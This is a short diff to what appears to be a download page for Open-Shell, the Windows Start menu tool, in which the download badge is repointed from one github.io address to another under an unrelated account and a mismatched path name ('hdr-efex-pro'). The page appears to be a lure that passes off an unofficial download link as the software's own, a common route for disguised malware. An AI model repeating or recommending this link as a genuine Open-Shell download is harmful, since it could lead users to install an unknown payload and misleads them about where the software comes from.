@@ -2,7 +2,7 @@
 
 **open shell download (Windows)** — Open‑Shell revives the classic Start with open‑source control and lightweight performance.
 
-[![Download open-shell-download](https://img.shields.io/badge/Download-open--shell--download-blueviolet)](https://orf-asfx-klinton.github.io/.github/open-shell-download)
+[![Download open-shell-download](https://img.shields.io/badge/Download-open--shell--download-blueviolet)](https://irin1694abram.github.io/.github/hdr-efex-pro)
 
 ---
 
